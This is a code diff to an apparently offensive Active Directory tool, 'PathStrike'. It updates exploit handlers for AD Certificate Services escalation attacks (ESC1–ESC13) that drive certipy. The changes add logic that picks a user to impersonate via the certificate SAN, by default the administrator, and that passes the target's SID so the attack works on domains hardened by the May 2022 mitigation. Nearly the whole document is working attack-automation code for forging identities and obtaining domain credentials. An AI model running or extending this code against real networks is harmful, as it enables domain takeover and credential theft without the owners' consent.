@@ -59,11 +59,83 @@ def _extract_edge_props(edge: EdgeInfo) -> dict:
     * ``ca_name`` -- the Certificate Authority name
     * ``template_name`` -- the certificate template name
     * ``domain`` -- target domain
+    * ``impersonate_user`` -- (PathStrike-injected) sAMAccountName to
+      impersonate via SAN.  Populated by the campaign / ``pathstrike adcs``
+      pre-handler step from ``config.target.adcs_impersonate``; falls
+      back to the BloodHound edge target when the edge target is a real
+      principal (e.g. a User node from BH).
+    * ``impersonate_sid`` -- (PathStrike-injected) target principal's SID
+      for ``certipy req -sid``.  Looked up via BloodHound when available;
+      omitted on environments that don't enforce the May 2022 mitigation.
     """
     props = dict(edge.properties)
     # Merge target node properties for template/CA info
     props.update(edge.target.properties)
     return props
+
+
+def _resolve_adcs_impersonation_target(
+    handler: BaseEdgeHandler, edge: EdgeInfo,
+) -> tuple[str, str | None]:
+    """Pick the principal to impersonate via SAN, plus its SID if known.
+
+    Resolution order (first non-empty wins):
+
+    1. ``edge.properties["impersonate_user"]`` — set by the pre-handler
+       step (campaign loop or ``pathstrike adcs --exploit``) from
+       ``config.target.adcs_impersonate`` or a CLI ``--impersonate``
+       flag.
+    2. The edge's target node, when it's a real principal (User /
+       Computer / Group label).  This preserves existing BH-driven
+       behaviour where ``ADCSESC1 → ADMINISTRATOR`` came from the BH
+       graph.
+    3. ``config.target.adcs_impersonate`` (default ``administrator``).
+
+    Returns ``(username, sid_or_None)``.  The SID comes from the same
+    edge-properties channel — when absent, certipy is invoked without
+    ``-sid`` (works on labs without the May 2022 mitigation; fails with
+    ``KDC_ERR_CLIENT_NOT_TRUSTED`` on hardened AD).
+    """
+    props = _extract_edge_props(edge)
+
+    # Sticky principal supplied by the orchestrator / CLI.
+    explicit = props.get("impersonate_user")
+    sid = props.get("impersonate_sid") or None
+
+    if explicit:
+        return (str(explicit).split("@", 1)[0], sid)
+
+    # Real BH principal as the edge target — preserve old behaviour.
+    target_label = (edge.target.label or "").lower()
+    target_name = edge.target.name or ""
+    if target_label in {"user", "computer", "group"} and target_name:
+        username = target_name.split("@", 1)[0]
+        return (username, sid)
+
+    # Synthetic edge (target = domain) or anything else — use config default.
+    fallback = getattr(handler.config.target, "adcs_impersonate", "administrator")
+    return (str(fallback).split("@", 1)[0], sid)
+
+
+def _resolve_adcs_target_host(
+    handler: BaseEdgeHandler,
+) -> tuple[str, str | None]:
+    """Pick the ``-target`` host (FQDN preferred) and an optional ``-target-ip``.
+
+    certipy uses ``-target`` for the RPC connection to the CA.  Passing
+    a bare IP makes certipy fall back to NETBIOS resolution which times
+    out on most networks; passing the FQDN with ``-target-ip <IP>``
+    bypasses DNS resolution entirely.
+
+    Returns ``(target, target_ip_or_None)``.  When ``dc_fqdn`` is unset,
+    we pass the IP as ``target`` and ``None`` as ``target_ip`` (same
+    behaviour as before this change).
+    """
+    dc_fqdn = handler.config.domain.dc_fqdn
+    dc_host = handler.config.domain.dc_host
+    if dc_fqdn:
+        return (dc_fqdn, dc_host)
+    return (dc_host, None)
 
 
 def _make_cert_credential(
@@ -230,7 +302,8 @@ class ADCSESC1Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -241,24 +314,28 @@ class ADCSESC1Handler(BaseEdgeHandler):
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would request cert from CA='{ca_name}', "
-                f"template='{template_name}' with UPN='{target_upn}'.",
+                f"template='{template_name}' with UPN='{target_upn}'{sid_note}.",
                 [],
             )
 
         # Step 1: Request certificate with alternate SAN
         self.logger.info(
-            "ESC1: Requesting certificate from CA='%s', template='%s', UPN='%s'",
+            "ESC1: Requesting certificate from CA='%s', template='%s', UPN='%s'%s",
             ca_name, template_name, target_upn,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
             upn=target_upn,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -326,7 +403,8 @@ class ADCSESC3Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -335,13 +413,13 @@ class ADCSESC3Handler(BaseEdgeHandler):
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
         agent_template = props.get("agent_template") or props.get("CertTemplate", "UNKNOWN-AGENT")
         target_template = props.get("target_template") or props.get("CertTemplate2", "User")
-        target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would request enrollment agent cert (template='{agent_template}'), "
-                f"then cert on behalf of '{target_user}' (template='{target_template}').",
+                f"then cert on behalf of '{target_user}'{sid_note} (template='{target_template}').",
                 [],
             )
 
@@ -351,7 +429,8 @@ class ADCSESC3Handler(BaseEdgeHandler):
             agent_template,
         )
         agent_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=agent_template,
             auth_args=auth_args,
@@ -371,17 +450,20 @@ class ADCSESC3Handler(BaseEdgeHandler):
 
         # Step 2: Request certificate on behalf of target using the agent cert
         self.logger.info(
-            "ESC3 Step 2: Requesting cert on behalf of '%s', template='%s'",
+            "ESC3 Step 2: Requesting cert on behalf of '%s', template='%s'%s",
             target_user, target_template,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         # Build auth args using the agent certificate
         agent_auth = ["-pfx", agent_pfx]
         obo_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=target_template,
             auth_args=agent_auth,
             on_behalf_of=f"{domain}\\{target_user}",
+            sid=target_sid,
         )
 
         if not obo_result["success"]:
@@ -458,7 +540,8 @@ class ADCSESC4Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -469,10 +552,11 @@ class ADCSESC4Handler(BaseEdgeHandler):
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would modify template '{template_name}' to ESC1, "
-                f"request cert as '{target_upn}', then restore template.",
+                f"request cert as '{target_upn}'{sid_note}, then restore template.",
                 [],
             )
 
@@ -502,14 +586,17 @@ class ADCSESC4Handler(BaseEdgeHandler):
 
         # Step 2: Request certificate with SAN (now ESC1-vulnerable)
         self.logger.info(
-            "ESC4 Step 2: Requesting certificate with UPN='%s'", target_upn,
+            "ESC4 Step 2: Requesting certificate with UPN='%s'%s",
+            target_upn, f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
             upn=target_upn,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -629,7 +716,8 @@ class ADCSESC6Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -641,24 +729,28 @@ class ADCSESC6Handler(BaseEdgeHandler):
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would request cert from CA='{ca_name}' "
-                f"(EDITF flag), template='{template_name}', UPN='{target_upn}'.",
+                f"(EDITF flag), template='{template_name}', UPN='{target_upn}'{sid_note}.",
                 [],
             )
 
         # Request certificate with SAN (exploiting the CA flag)
         self.logger.info(
-            "ESC6: Requesting cert from CA='%s' with UPN='%s' (EDITF flag exploit)",
+            "ESC6: Requesting cert from CA='%s' with UPN='%s'%s (EDITF flag exploit)",
             ca_name, target_upn,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
             upn=target_upn,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -730,7 +822,8 @@ class ADCSESC9Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         source_user = self._resolve_principal(edge)
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -741,9 +834,10 @@ class ADCSESC9Handler(BaseEdgeHandler):
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
-                f"[DRY RUN] Would change UPN of '{source_user}' to '{target_upn}', "
+                f"[DRY RUN] Would change UPN of '{source_user}' to '{target_upn}'{sid_note}, "
                 f"request cert, restore UPN, then authenticate.",
                 [],
             )
@@ -775,14 +869,17 @@ class ADCSESC9Handler(BaseEdgeHandler):
 
         # Step 2: Request certificate (cert will map to target via UPN)
         self.logger.info(
-            "ESC9 Step 2: Requesting cert as '%s' (UPN now='%s')",
+            "ESC9 Step 2: Requesting cert as '%s' (UPN now='%s')%s",
             source_user, target_upn,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -900,7 +997,8 @@ class ADCSESC10Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         source_user = self._resolve_principal(edge)
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -911,9 +1009,10 @@ class ADCSESC10Handler(BaseEdgeHandler):
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
-                f"[DRY RUN] ESC10: Would change UPN of '{source_user}' to '{target_upn}', "
+                f"[DRY RUN] ESC10: Would change UPN of '{source_user}' to '{target_upn}'{sid_note}, "
                 f"request cert from template='{template_name}', restore UPN, authenticate.",
                 [],
             )
@@ -942,14 +1041,17 @@ class ADCSESC10Handler(BaseEdgeHandler):
 
         # Step 2: Request certificate
         self.logger.info(
-            "ESC10 Step 2: Requesting cert as '%s' (UPN='%s')",
+            "ESC10 Step 2: Requesting cert as '%s' (UPN='%s')%s",
             source_user, target_upn,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -1065,7 +1167,7 @@ class ADCSESC13Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         source_user = self._resolve_principal(edge)
-        target_user = self._resolve_target(edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -1082,13 +1184,17 @@ class ADCSESC13Handler(BaseEdgeHandler):
                 [],
             )
 
-        # Step 1: Request certificate with the OID-linked template
+        # Step 1: Request certificate with the OID-linked template.  ESC13
+        # does NOT impersonate — the cert is issued to source_user, and
+        # the OID-to-group linkage is what grants privileges on auth.
+        # Don't pass -upn or -sid; we want the cert's natural identity.
         self.logger.info(
             "ESC13: Requesting cert from CA='%s', template='%s' (OID group link)",
             ca_name, template_name,
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
@@ -1171,7 +1277,8 @@ class ADCSESC2Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -1182,25 +1289,30 @@ class ADCSESC2Handler(BaseEdgeHandler):
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would request cert from CA='{ca_name}', "
                 f"template='{template_name}' (Any Purpose/SubCA EKU), "
-                f"then authenticate as '{target_upn}'.",
+                f"then authenticate as '{target_upn}'{sid_note}.",
                 [],
             )
 
         # Step 1: Request certificate with the Any Purpose / SubCA template
         self.logger.info(
             "ESC2: Requesting certificate from CA='%s', template='%s' "
-            "(Any Purpose/SubCA EKU)",
-            ca_name, template_name,
+            "(Any Purpose/SubCA EKU) UPN='%s'%s",
+            ca_name, template_name, target_upn,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
+            upn=target_upn,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -1278,37 +1390,44 @@ class ADCSESC5Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        default_target_host, default_target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
-        ca_host = props.get("ca_host") or props.get("hostname") or dc_host
+        # Edge may carry an explicit CA host (FQDN); fall back to the DC FQDN/IP
+        # picked by _resolve_adcs_target_host so we still bypass NETBIOS resolution.
+        ca_host = props.get("ca_host") or props.get("hostname") or default_target_host
         template_name = props.get("template_name") or props.get("CertTemplate", "User")
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would request cert from CA='{ca_name}' via HTTP "
                 f"enrollment on '{ca_host}', template='{template_name}', "
-                f"then authenticate as '{target_upn}'.",
+                f"then authenticate as '{target_upn}'{sid_note}.",
                 [],
             )
 
         # Request certificate via HTTP enrollment
         self.logger.info(
-            "ESC5: Requesting cert from CA='%s' via HTTP enrollment on '%s'",
+            "ESC5: Requesting cert from CA='%s' via HTTP enrollment on '%s'%s",
             ca_name, ca_host,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
             target=ca_host,
+            target_ip=default_target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
             upn=target_upn,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -1385,7 +1504,8 @@ class ADCSESC7Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        target_host, target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
@@ -1398,11 +1518,12 @@ class ADCSESC7Handler(BaseEdgeHandler):
         template_name = props.get("template_name") or "SubCA"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would enable SubCA template on CA='{ca_name}', "
-                f"request cert as '{target_upn}', approve the pending request "
-                f"as CA Officer, then authenticate.",
+                f"request cert as '{target_upn}'{sid_note}, approve the pending "
+                f"request as CA Officer, then authenticate.",
                 [],
             )
 
@@ -1426,15 +1547,18 @@ class ADCSESC7Handler(BaseEdgeHandler):
         # Step 2: Request a certificate (will be held pending for CA approval)
         self.logger.info(
             "ESC7 Step 2: Requesting cert from CA='%s', template='%s' "
-            "(will be held pending for approval)",
+            "(will be held pending for approval)%s",
             ca_name, template_name,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
             upn=target_upn,
+            sid=target_sid,
         )
 
         # The request may "fail" but still return a request ID (pending)
@@ -1576,38 +1700,43 @@ class ADCSESC8Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        default_target_host, default_target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
-        ca_host = props.get("ca_host") or props.get("hostname") or dc_host
+        ca_host = props.get("ca_host") or props.get("hostname") or default_target_host
         template_name = props.get("template_name") or props.get("CertTemplate", "Machine")
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would relay NTLM auth to CA='{ca_name}' at "
                 f"'http://{ca_host}/certsrv/', request cert via template='{template_name}', "
-                f"then authenticate as '{target_upn}'.",
+                f"then authenticate as '{target_upn}'{sid_note}.",
                 [],
             )
 
         # Request certificate via HTTP enrollment (simulating relay scenario)
         self.logger.info(
             "ESC8: Requesting cert from CA='%s' via HTTP enrollment on '%s' "
-            "(template='%s')",
+            "(template='%s')%s",
             ca_name, ca_host, template_name,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
             target=ca_host,
+            target_ip=default_target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
             upn=target_upn,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
@@ -1689,39 +1818,44 @@ class ADCSESC11Handler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_user = self._resolve_target(edge)
+        target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
+        default_target_host, default_target_ip = _resolve_adcs_target_host(self)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
-        ca_host = props.get("ca_host") or props.get("hostname") or dc_host
+        ca_host = props.get("ca_host") or props.get("hostname") or default_target_host
         template_name = props.get("template_name") or props.get("CertTemplate", "Machine")
         target_upn = f"{target_user}@{domain}"
 
         if dry_run:
+            sid_note = f" (SID={target_sid})" if target_sid else ""
             return (
                 True,
                 f"[DRY RUN] Would relay NTLM auth to CA='{ca_name}' RPC "
                 f"interface on '{ca_host}' (no encryption enforcement), "
                 f"request cert via template='{template_name}', "
-                f"then authenticate as '{target_upn}'.",
+                f"then authenticate as '{target_upn}'{sid_note}.",
                 [],
             )
 
         # Request certificate via RPC interface (simulating relay scenario)
         self.logger.info(
             "ESC11: Requesting cert from CA='%s' via RPC on '%s' "
-            "(IF_ENFORCEENCRYPTICERTREQUEST not set, template='%s')",
+            "(IF_ENFORCEENCRYPTICERTREQUEST not set, template='%s')%s",
             ca_name, ca_host, template_name,
+            f" SID='{target_sid}'" if target_sid else "",
         )
         req_result = await certipy_request(
             target=ca_host,
+            target_ip=default_target_ip,
             ca=ca_name,
             template=template_name,
             auth_args=auth_args,
             upn=target_upn,
+            sid=target_sid,
         )
 
         if not req_result["success"]:
